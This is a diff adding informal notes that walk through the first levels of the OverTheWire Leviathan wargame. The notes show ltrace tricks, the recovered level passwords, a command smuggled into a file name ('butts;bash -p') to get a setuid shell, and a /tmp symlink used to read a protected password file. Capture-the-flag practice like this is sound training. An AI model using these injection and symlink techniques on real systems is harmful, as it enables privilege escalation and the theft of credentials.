@@ -1,0 +1,63 @@
+ssh -p 2223 leviathan0@leviathan.labs.onthewire.org (this command will be repeated with minor changes, I will only be reporting changes in the form of 'ssh ... change ...'
+ls -lah
+cd .backup
+ls -lah (this will just be written as ls in the future, its always -lah though)
+cat bookmarks.html | grep leviathan1
+PPIfmI1qsA
+exit
+ssh ... leviathan1 ...
+ls
+./check
+ltrace check
+butts
+it shows the password, being compared when you try one 'sex'
+./check
+sex
+whoami
+cat /etc/leviathan_pass/leviathan2
+mEh5PNl10e
+ssh ... 2 ...
+ls
+./printfile
+it asks for a file to read, feeding it the password file for 3 tells you no
+ltrace ./printfile /etc/leviathan_pass/leviathan3
+ltrace ./printfile .profile
+checks for file access, then does a setuid operation, I believe a file with a bad name can break this
+mktemp -d /tmp/rabid.XXX
+cd /tmp/rabid.nTL
+I now did too much googling to put here on bad file names for bash, but found that bash -p keeps setuid permissions, and know any file with commands in the name will run, and ; is a command seperator
+touch "butts;bash -p"
+/home/leviathan2/printfile "butts;bash -p"
+gave me a bash shell as leviathan3 as expected
+cat /etc/leviathan_pass/leviathan3
+Q0G8j4sakn
+ssh ... 3 ...
+ls
+./level3
+ltrace ./level3
+kakaka
+its comparing to snlprintf
+./level3
+snlprintf
+whoami
+cat /etc/leviathan_pass/leviathan4
+AgvropI4OA
+ssh ... 4 ...
+ls
+cd .trash
+ls
+./bin
+it gives binary, I am assuming its the password and I just need to convert it
+EKKlTF1Xqs
+ssh ... 5 ...
+ls
+./leviathan5
+got an error about a file log
+ltrace ./leviathan5
+man fopen
+mktemp /tmp/file.log.XXX
+mv /tmp/file.log.IQN /tmp/file.log
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+rm /tmp/file.log
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+YZ55XPVk2l
